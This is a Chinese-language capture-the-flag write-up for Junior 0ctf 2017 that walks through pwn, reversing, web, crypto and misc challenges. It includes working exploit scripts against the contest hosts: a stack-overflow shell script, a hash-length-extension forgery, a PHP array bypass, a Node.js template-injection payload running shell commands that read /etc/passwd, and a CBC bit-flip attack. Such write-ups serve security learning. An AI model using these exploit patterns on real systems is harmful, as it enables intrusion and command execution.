---
title: Wirteup - Junior 0ctf 2017
categories: [Security]
tags: [ctf]
date: 2017-12-18T00:00:00+08:00
---

## PWN

### seabreeze's stack

栈溢出题目，直接在IDA中可以看到缓冲区相对于栈基址的偏移：`bp-3FCH`，然后可以看到题目中有一`getshell()`函数，其地址为`0x080485CB`。

覆盖原本的函数返回地址为`getshell()`的地址，利用以下脚本获取shell：

``` python
from pwn import *

conn = remote('202.121.178.181', '12321')
print conn.recvline()
conn.sendline('Yes!')
print conn.recvline()
conn.sendline('Yes!!')
print conn.recvline()
conn.sendline('Yes!!!')

shell_addr = 0x080485cb

payload = 'a'*0x3fc + 'bbbb' + p32(shell_addr)

conn.sendline(payload)
conn.interactive()
```

随后可以读flag。

## REVERSE

### babyre

利用`uncompyle2`工具可以直接获得pyc文件对应的py代码：

``` python
from hashlib import md5

def md5raw(s):
    return bytearray(md5(s).digest())

def xor(a, b):
    assert len(a) == len(b)
    return bytearray([ i ^ j for i, j in zip(a, b) ])


flag = bytearray(raw_input('Show me your flag: '))
assert len(flag) == 32
for i in range(16):
    flag[:16] = xor(flag[:16], md5raw(flag[16:]))
    flag[:16], flag[16:] = flag[16:], flag[:16]

if flag == '\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n':
    print 'Right!'
else:
    print 'Wrong!'
```

可以看到给出了加密结果和加密过程，需要反求原文。加密数据长度为32字节，分为左右两个部分各16字节，将第一部分与第二部分的MD5做异或之后保存为新的第一部分，然后将两部分位置互换，循环16次。

由于异或是可逆的，那么解密过程就是将密文先调换位置再进行异或，循环16次。脚本：

``` python
from hashlib import md5

def md5raw(s):
    return bytearray(md5(s).digest())

def xor(a, b):
    assert len(a) == len(b)
    return bytearray([ i ^ j for i, j in zip(a, b) ])


flag = '\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n'
flag = bytearray(flag)
for i in range(16):
    flag[:16], flag[16:] = flag[16:], flag[:16]
    flag[:16] = xor(flag[:16], md5raw(flag[16:]))

print flag
```

### encoder

利用IDA分析代码，可以看出这编码类似于base32编码，将5个字节用八个可见字符来表示。

代码的关键逻辑位于`sub_4006d6`中，如下：

``` c
_BYTE *__fastcall sub_4006D6(unsigned __int64 a1, signed int a2)
{
  signed int i; // [sp+14h] [bp-2Ch]@4
  signed int j; // [sp+14h] [bp-2Ch]@9
  signed int v5; // [sp+18h] [bp-28h]@2
  int v6; // [sp+1Ch] [bp-24h]@9
  unsigned __int64 v7; // [sp+20h] [bp-20h]@2
  unsigned __int64 v8; // [sp+28h] [bp-18h]@1
  _BYTE *v9; // [sp+30h] [bp-10h]@1
  _BYTE *v10; // [sp+38h] [bp-8h]@1

  v10 = malloc(8 * (a2 / 5 + 1) + 1);
  v8 = a1;
  v9 = v10;
  while ( a2 + a1 > v8 )
  {
    v7 = 0LL;
    v5 = a2 + a1 - v8;
    if ( v5 > 5 )
      v5 = 5;
    for ( i = 0; i <= 4; ++i )
    {
      v7 <<= 8;
      if ( i < v5 )
        v7 |= *(_BYTE *)(i + v8);
    }
    v6 = dword_6010B0[v5 - 1];
    for ( j = 7; j >= 0; --j )
    {
      v9[j] = byte_601080[v7 & 0x1F];
      v7 >>= 5;
    }
    if ( v6 )
      memset(&v9[8LL - v6], 61, v6);
    v8 += 5LL;
    v9 += 8;
  }
  *v9 = 0;
  return v10;
}
```

`a1`为原文数据指针，`a2`为数据长度，`v9`、`v10`为编码后密文数据指针。

每个while循环都处理原文的五个字节，先将五个字节移到`v7`变量中，然后再每五个bit地逐个取出，作为下标，取出地址0x601080处的字符串（`afe7WlyVd12XKLhnqvzQb5B6sNR8gYME`）中的字符作为密文。长度不足五个字节时，密文则使用`=`填充。

不是很会用python处理bit级的数据，所以用脚本得到明文的字符串形式的01二进制串，随后在网上随便找了个在线的二进制转字符串的工具得到flag，不过需要删掉最后的多余二进制数据。

	flag{d0_U_Kn0w_ba5e32:P}

脚本：

``` python
#!/usr/bin/python                                 
#coding=utf-8

key = "afe7WlyVd12XKLhnqvzQb5B6sNR8gYME"
cipher = "KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd"

l = []

for i in range(len(cipher)):
    l.append(key.index(cipher[i]))

s = ''
for i in l:
    b = bin(i)[2:]
    b = '0' * (5 - len(b)) + b
    s += b

print s.decode('bin')
```

### admin

利用IDA逆向分析，此题在`sub_400980`函数中做了一堆函数指针变量等的初始化，所以后面的代码全是变量名。。。

加密的过程中有两个循环，经过分析，第一个循环主要是对地址`0x6010A0`的256bytes的有序数据的处理，可以认为是在生成密钥，事实上无需对此过程进行详细分析，这一部分与输入无关。

第二个循环则是将用户输入的数据与刚刚生成的密钥进行一系列异或处理，然后判断加密结果是否与地址`0x601080`的20个字节相等；如果相等，则输入正确。

根据异或运算的可逆性，我们同样不用具体分析到底加密处理是什么具体流程，将`0x601080`处的数据作为输入，则结果即为我们要的flag。只是此处需要用gdb动态调试一下，在输入处理完后断下，观察内存中得出的flag值。

## WEB

### penetrate in

此题考点为哈希长度扩展攻击，可以利用hashpumpy来解决。其中secret的长度未知，需要暴力破解一下。

脚本：

``` python
#!/usr/bin/python 
#coding=utf-8

import hashpumpy
import requests

url = "http://202.121.178.201:8081/index.php"
data = {"username" : "admin", "password" : ""}
headers = {"Cookie" : ""}

for i in range(5, 100):
    print "secret length: "  + str(i)
    res = hashpumpy.hashpump("be9fcfa876db5f4184e1635ce6561de7", "|admin|admin", "a", i)
    headers["Cookie"] = "hmac=" + res[0]
    data["password"] = res[1][7:]
    print headers
    print data

    r = requests.post(url, data=data, headers=headers)
    if 'flag' in r.text:
        print r.text
        exit()
```

### Shatter Sha512!

此题hash结果的相等判断处使用的是严格的`===`，这就想到PHP的一个trick，hash函数不能处理`Array`类型的变量，首先会把`Array`类型的变量转换为常量字符串`"Array"`。

将变量设置为数组类型即可绕过：

	http://addr/?x[]=1&y[]=2

### Super Security Blog

此题采用的node.js的express框架为后端，考虑存在SSTI漏洞，在post新文章时构造内容`{{7*7}}`，可以得到输出49，说明存在漏洞。

构造post文章的内容为

```js
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```
验证可以执行shell命令，进而拿到flag。

## CRYPTO

### AES-server

此题中使用的AES加密模式为CBC模式，加密的数据只有一个分组，并且我们可以直接控制IV的值。

可以利用CBC字节反转攻击来获取flag，CBC模式解密时将分组解密后的结果与上一个分组的密文异或之后才是明文，第一个分组则是与IV异或，IV中一个bit位的改变会导致结果中对应bit位的改变。

既然我们可以控制IV，那么就可以控制解密结果。首先随便构造IV与密文，根据传输回来的结果的前五个字节与`'admin'`的差异对应改变IV即可，脚本：

``` python
#!/usr/bin/python                                        
#coding=utf-8

from pwn import *

iv = '0' * 16
data = '0' * 16
target = 'admin'

conn = remote('202.121.178.199', '9999')
print conn.recvline()
print conn.recvline()

conn.sendline(iv.encode('hex') + data.encode('hex'))
re = conn.recvline()
print re
conn.close()

re = eval(re[24:-1])
iv = list(iv)

for i in range(5):
    iv[i] = chr(ord(re[i]) ^ ord(target[i]) ^ ord(iv[i]))

iv = ''.join(iv)
print iv

conn = remote('202.121.178.199', '9999')
print conn.recvline()
print conn.recvline()

conn.sendline(iv.encode('hex') + data.encode('hex'))
re = conn.recvline()
print re
print conn.recvline()
conn.close()
```

### babyrsa

可以从公钥文件得出n的值为

	39845701744153150941069529194757526450699838667585381414738119544695931460213
利用[http://factordb.com/](http://factordb.com/)可查的其分解p、q：

	188666695751907128183793686145558707837 *  211196266438828393956393541007231202649

使用rsatool工具通过p、q构造私钥，然后利用openssl解密即得flag。

## MISC

Mystery Numbers：首先hex decode，然后base64 decode。

Easy Traffic Analyze：利用已有pcap文件复制文件头过去修复文件，dump出zip文件，解压得图片，得文件中的明文flag。